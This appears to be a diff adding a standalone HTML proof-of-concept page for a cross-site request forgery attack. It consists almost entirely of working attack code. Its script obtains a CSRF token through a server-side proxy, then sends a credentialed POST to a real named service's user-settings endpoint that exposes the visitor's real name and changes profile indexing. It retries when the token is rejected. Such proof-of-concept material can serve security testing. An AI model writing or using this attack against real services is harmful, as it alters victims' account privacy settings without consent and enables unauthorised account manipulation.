@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CSRF Test with Dynamic Token</title>
+</head>
+<body>
+  <h1>CSRF Attack Test</h1>
+  <p>This page demonstrates fetching a dynamic CSRF token from a proxy and then using it in a POST request.</p>
+  <button id="launchAttack">Launch Attack</button>
+  
+  <script>
+    async function getCsrfToken() {
+      try {
+        // Call our server-side proxy to get the current CSRF token
+        const res = await fetch('/proxy/getToken');
+        const data = await res.json();
+        if (data.token) {
+          console.log("Fetched CSRF token:", data.token);
+          return data.token;
+        } else {
+          throw new Error("Token not found in response.");
+        }
+      } catch (error) {
+        console.error("Error fetching CSRF token:", error);
+        return null;
+      }
+    }
+
+    async function sendPostRequest(csrfToken) {
+      try {
+        const res = await fetch("https://quizlet.com/webapi/3.9/users/change-options?show_real_name=true&should_index_profile=false", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Cs-Token": csrfToken // Using the fetched token
+          },
+          credentials: "include"  // Ensures cookies are sent
+        });
+        const text = await res.text();
+        console.log("POST response:", text);
+        return text;
+      } catch (error) {
+        console.error("Error sending POST request:", error);
+        return null;
+      }
+    }
+
+    async function launchAttack() {
+      // Step 1: Get the current CSRF token from our proxy.
+      let csrfToken = await getCsrfToken();
+      if (!csrfToken) {
+        alert("Failed to obtain CSRF token. Aborting.");
+        return;
+      }
+      
+      // Step 2: Send the POST request with the token.
+      let response = await sendPostRequest(csrfToken);
+      
+      // Optional: If the response indicates a CSRF error, try to re-fetch and resend.
+      if (response && response.includes("CSRF token header is not found")) {
+        console.warn("CSRF error detected. Re-fetching token and retrying...");
+        csrfToken = await getCsrfToken();
+        if (csrfToken) {
+          response = await sendPostRequest(csrfToken);
+        }
+      }
+    }
+
+    document.getElementById('launchAttack').addEventListener('click', launchAttack);
+  </script>
+</body>
+</html>
